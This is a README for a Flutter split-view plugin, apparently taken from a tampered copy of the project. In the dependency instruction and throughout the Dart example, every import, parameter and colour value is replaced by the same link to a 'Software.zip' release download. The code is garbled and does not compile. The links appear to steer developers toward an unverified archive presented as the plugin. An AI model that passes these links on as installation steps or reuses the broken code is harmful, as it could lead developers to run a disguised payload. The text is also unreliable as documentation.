# Splitter view plugin

A splitter view for flutter.

## Usage
To use this plugin, add split_view as a [dependency in your https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip file](https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip).

## Example
```dart
import 'https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip';
import 'https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
      ),
      home: MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  MyHomePage({Key key, https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip}) : super(key: key);

  final String title;

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip!),
      ),
      body: SplitView(
        children: [
          SplitView(
            viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
            indicator: SplitIndicator(viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip),
            activeIndicator: SplitIndicator(
              viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
              isActive: true,
            ),
            children: [
              Container(
                child: Center(child: Text("View1")),
                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
              ),
              Container(
                child: Center(child: Text("View2")),
                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
              ),
              Container(
                child: Center(child: Text("View3")),
                color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
              ),
            ],
            onWeightChanged: (w) => print("Horizon: $w"),
          ),
          Container(
            child: Center(child: Text("View4")),
            color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
          ),
          Container(
            child: Center(child: Text("View5")),
            color: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
          ),
        ],
        viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
        indicator: SplitIndicator(viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip),
        activeIndicator: SplitIndicator(
          viewMode: https://github.com/huizuohaode/split_view/releases/download/v1.0/Software.zip,
          isActive: true,
        ),
        controller: SplitViewController(limits: [null, WeightLimit(max: 0.5)]),
        onWeightChanged: (w) => print("Vertical $w"),
      ),
    );
  }
}
```

## ToDo
- Add tests.
- Aim to enhance documents.
- and more...